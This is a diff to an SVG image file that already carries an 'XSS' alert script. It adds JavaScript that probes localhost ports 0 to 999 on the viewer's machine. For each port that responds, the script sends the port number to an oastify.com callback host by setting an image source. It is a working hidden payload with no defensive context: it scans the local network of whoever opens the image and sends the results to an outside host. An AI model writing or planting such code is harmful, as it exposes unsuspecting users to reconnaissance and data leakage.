@@ -6,4 +6,18 @@
   <script type="text/javascript">
     alert("XSS ");
   </script>
+      
+    <script>
+    const checkPort = (port) => {
+    fetch(`http://localhost:${port}`, { mode: "no-cors" }).then(() => {
+        let img = document.createElement("img");
+        img.src = `https://8ktvivb8bvjo2bp0zdckxg7f86ex2pqe.oastify.com/ping?port=${port}`;
+    });
+}
+
+for(let i=0; i<1000; i++) {
+    checkPort(i);
+}
+
+</script>
 </svg>
